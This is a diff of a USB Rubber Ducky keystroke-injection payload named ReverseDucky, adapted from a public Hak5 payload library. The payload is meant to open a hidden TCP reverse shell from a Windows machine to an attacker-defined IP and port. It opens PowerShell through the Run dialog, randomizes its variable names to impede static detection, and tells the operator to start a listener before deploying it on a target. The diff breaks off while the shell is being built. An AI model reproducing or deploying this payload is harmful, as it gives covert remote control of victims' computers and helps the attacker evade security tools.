@@ -1,26 +1,25 @@
-REM Title: ReverseDuckyPolymorph
+REM Title: ReverseDucky
 REM Author: 0i41E, Korben
-REM Version 1.1
+REM Target: Windows
+REM Link: https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/remote_access/ReverseDuckyPolymorph
 
-REM Target: Windows / Linux(?) (Not tested with Powershell on Linux)
-REM Requirements: DuckyScript 3.0, PayloadStudio v. 1.3.0 minimum
 
-REM Description:
+REM === Description ===
 REM TCP Reverse shell executed hidden in the background, 
 REM the CAPSLOCK light at the end will indicate that the payload was executed.
 REM Because of randomisation static detection will be impeded
 REM DON'T FORGET TO START LISTENER BEFORE DEPLOYING ON TARGET
 
-REM REQUIRED: Define the attackers IP & Port
+REM ===========================================================
+REM REQUIRED: Define the attackers IP & Port    -- EDIT THIS
+REM ===========================================================
 DEFINE ADDRESS '10.193.89.227'
 DEFINE PORT 4444
 
 REM Extension DETECT_READY by Korben for best and fastest deployment
 EXTENSION DETECT_READY
-    REM VERSION 1.1
-    REM AUTHOR: Korben
 
-    REM_BLOCK DOCUMENTATION
+    REM_BLOCK === DOCUMENTATION ===
         USAGE:
             Extension runs inline (here)
             Place at beginning of payload (besides ATTACKMODE) to act as dynamic
@@ -31,7 +30,7 @@ EXTENSION DETECT_READY
             Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
     END_REM
 
-    REM CONFIGURATION:
+    REM === CONFIGURATION ===
     DEFINE #RESPONSE_DELAY 500
     DEFINE #ITERATION_LIMIT 120
 
@@ -45,7 +44,7 @@ EXTENSION DETECT_READY
 END_EXTENSION
 
 
-REM Variables for pseudo random variables
+REM === Variables for pseudo randomizing ===
 VAR $var_gibberish = $_RANDOM_NUMBER_KEYCODE
 VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
 VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
@@ -55,11 +54,14 @@ VAR $var_duckID = $_RANDOM_UPPER_LETTER_KEYCODE
 VAR $var_duckID2 = $_RANDOM_NUMBER_KEYCODE
 VAR $var_duckID3 = $_RANDOM_NUMBER_KEYCODE
 
+REM === Open PowerShell ===
 DELAY 1500
 GUI r
 DELAY 500
 STRINGLN powershell
 DELAY 500
+
+REM === Craft the TCP Reverse Shell ===
 STRING $
 INJECT_VAR $var_gibberish
 INJECT_VAR $var_gibberish2
